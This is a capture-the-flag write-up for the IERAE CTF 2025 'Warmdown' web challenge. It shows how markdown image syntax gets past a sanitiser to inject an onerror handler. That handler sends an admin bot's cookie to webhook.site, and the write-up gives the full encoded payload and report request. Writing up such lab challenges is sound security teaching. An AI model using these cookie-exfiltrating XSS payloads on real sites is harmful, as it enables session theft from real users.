# Challenge Details
Challenge name: Warmdown  
Competition: IERAE CTF 2025  
Category: Web/warmup  
Difficulty: Easy  
Points: 138  
Solves: 135

# Challenge Description
Warmdown = Warmup + Markdown

Challenge: http://34.146.192.216:3000
Admin bot: http://34.85.61.65:1337

# About the challenge
Nice challenge involving getting the bots cookie with a webhook.

# Solve
```js
const context = await browser.createBrowserContext();
try {
    await context.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
});
...
await page.goto(url, { timeout: 5_000 });
```
The bot uses Puppeteer to manually **set the flag as a cookie** in the browser context before visiting the page. It then **visits the url that you provide** it. 

Note: you will only be able to access the cookie if the url you provided is the same domain as **APP_HOST**. In this case its just "web".

To do a simple xss attack you can do 
```js
<img src = "x" onerror = "fetch('https://webhook.site/?c=' + encodeURIComponent(document.cookie))">
```
We will pass the payload to the bot by putting it in the markdown parameter.
But wait, take a look at the web pages backend.
```js
const sanitize = (unsafe) => unsafe.replaceAll("<", "＜").replaceAll(">", "＞");

const escapeHtml = (str) =>
  str
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");

const unescapeHtml = (str) =>
  str
    .replaceAll("&amp;", "&")
    .replaceAll("&lt;", "<")
    .replaceAll("&gt;", ">")
    .replaceAll("&quot;", '"')
    .replaceAll("&#039;", "'");

app.get("/render", async (req, reply) => {
  const markdown = sanitize(String(req.query.markdown));
  if (markdown.length > 1024) {
    return reply.status(400).send("Too long");
  }

  const escaped = escapeHtml(marked.parse(markdown));
  const unescaped = unescapeHtml(escaped);

  return { escaped, unescaped };
});
```
Our payload will undergo sanitisation, as well as become parsed through **marked.parse(markdown)**
*<span style="font-size: 12px">As our input undergoes escapeHTML but then immediately undergoes unescapeHTML, we can ignore it. </span>*

We will have to change the format of our payload to **Markdown format**
```js
![x" onerror="fetch('https://webhook.site/.../?c='+encodeURIComponent(document.cookie))" z="](x)
```
URL encoding gives us
```js
%21%5Bx%22%20onerror%3D%22fetch('https%3A%2F%2Fwebhook.site%2F....%2F%3Fc%3D'%2BencodeURIComponent(document.cookie))%22%20z%3D%22%5D(x)
```
## Final payload that we can send to burpsuite/curl
```
POST /api/report HTTP/1.1
Host: 34.85.61.65:1337
Content-Type: application/json
Content-Length: 218

{"url":"http://web:3000/?markdown=%21%5Bx%22%20onerror%3D%22fetch('https%3A%2F%2Fwebhook.site%2F.....%2F%3Fc%3D'%2BencodeURIComponent(document.cookie))%22%20z%3D%22%5D(x)"}
```

Flag: IERAE{I_know_XSS_is_the_m0st_popular_vu1nerabili7y}
